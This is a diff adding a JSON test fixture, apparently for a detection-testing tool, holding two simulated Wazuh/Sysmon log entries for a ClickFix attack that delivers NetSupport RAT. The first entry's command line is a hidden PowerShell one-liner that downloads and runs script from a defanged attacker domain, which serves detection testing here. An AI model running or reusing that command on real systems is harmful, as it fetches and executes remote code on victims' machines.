@@ -1,0 +1,116 @@
+{
+  "_metadata": {
+    "attack_id": "T1059.001",
+    "variation": "002",
+    "name": "IClickFix ClickFix - Clipboard PowerShell Execution",
+    "description": "Simulates IClickFix framework ClickFix social engineering delivering NetSupport RAT",
+    "expected_detection": "HIGH",
+    "kill_chain_phase": "execution",
+    "source_url": "https://blog.sekoia.io/meet-iclickfix-a-widespread-wordpress-targeting-framework-using-the-clickfix-tactic/",
+    "format": "wazuh-native",
+    "format_version": "1.0"
+  },
+  "logs": [
+    {
+      "_comment": "Sysmon Event 1 - PowerShell from Run dialog (clipboard paste)",
+      "sequence": 1,
+      "timestamp": "2026-02-03T10:20:00.000Z",
+      "log": {
+        "timestamp": "2026-02-03T10:20:00.000Z",
+        "rule": {
+          "level": 14,
+          "description": "Sysmon - Event 1: ClickFix PowerShell execution from Explorer",
+          "id": "92151",
+          "mitre": {
+            "id": ["T1059.001", "T1566.002"],
+            "tactic": ["Execution", "Initial Access"],
+            "technique": ["Command and Scripting Interpreter: PowerShell", "Phishing: Spearphishing Link"]
+          },
+          "groups": ["sysmon", "sysmon_event1", "windows"]
+        },
+        "agent": {"id": "007", "name": "WS01", "ip": "10.1.0.20"},
+        "manager": {"name": "wazuh.manager"},
+        "id": "1706951200.000012",
+        "decoder": {"name": "windows_eventchannel"},
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "1",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "WS01.corp.local"
+            },
+            "eventdata": {
+              "utcTime": "2026-02-03 10:20:00.000",
+              "processGuid": "{12345678-1234-1234-1234-123456789040}",
+              "processId": "3456",
+              "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+              "commandLine": "powershell.exe -w hidden IEX((New-Object Net.WebClient).DownloadString('hxxps://ototaikfffkf.com/fffa.js'))",
+              "currentDirectory": "C:\\Users\\victim\\",
+              "user": "CORP\\victim",
+              "integrityLevel": "Medium",
+              "parentProcessGuid": "{12345678-1234-1234-1234-123456789039}",
+              "parentProcessId": "2584",
+              "parentImage": "C:\\Windows\\explorer.exe",
+              "parentCommandLine": "C:\\Windows\\explorer.exe"
+            }
+          }
+        },
+        "_fomorian_test": true,
+        "_fomorian_attack_id": "T1059.001",
+        "_fomorian_batch": "morning-intel-20260203"
+      }
+    },
+    {
+      "_comment": "Sysmon Event 1 - NetSupport RAT execution",
+      "sequence": 2,
+      "timestamp": "2026-02-03T10:20:15.000Z",
+      "log": {
+        "timestamp": "2026-02-03T10:20:15.000Z",
+        "rule": {
+          "level": 14,
+          "description": "Sysmon - Event 1: NetSupport RAT execution",
+          "id": "92151",
+          "mitre": {
+            "id": ["T1219"],
+            "tactic": ["Command and Control"],
+            "technique": ["Remote Access Software"]
+          },
+          "groups": ["sysmon", "sysmon_event1", "windows"]
+        },
+        "agent": {"id": "007", "name": "WS01", "ip": "10.1.0.20"},
+        "manager": {"name": "wazuh.manager"},
+        "id": "1706951215.000013",
+        "decoder": {"name": "windows_eventchannel"},
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "1",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "WS01.corp.local"
+            },
+            "eventdata": {
+              "utcTime": "2026-02-03 10:20:15.000",
+              "processGuid": "{12345678-1234-1234-1234-123456789041}",
+              "processId": "4892",
+              "image": "C:\\Users\\victim\\AppData\\Roaming\\NetSupport\\client32.exe",
+              "commandLine": "\"C:\\Users\\victim\\AppData\\Roaming\\NetSupport\\client32.exe\"",
+              "currentDirectory": "C:\\Users\\victim\\AppData\\Roaming\\NetSupport\\",
+              "user": "CORP\\victim",
+              "integrityLevel": "Medium",
+              "parentProcessGuid": "{12345678-1234-1234-1234-123456789040}",
+              "parentProcessId": "3456",
+              "parentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+            }
+          }
+        },
+        "_fomorian_test": true,
+        "_fomorian_attack_id": "T1059.001",
+        "_fomorian_batch": "morning-intel-20260203"
+      }
+    }
+  ]
+}
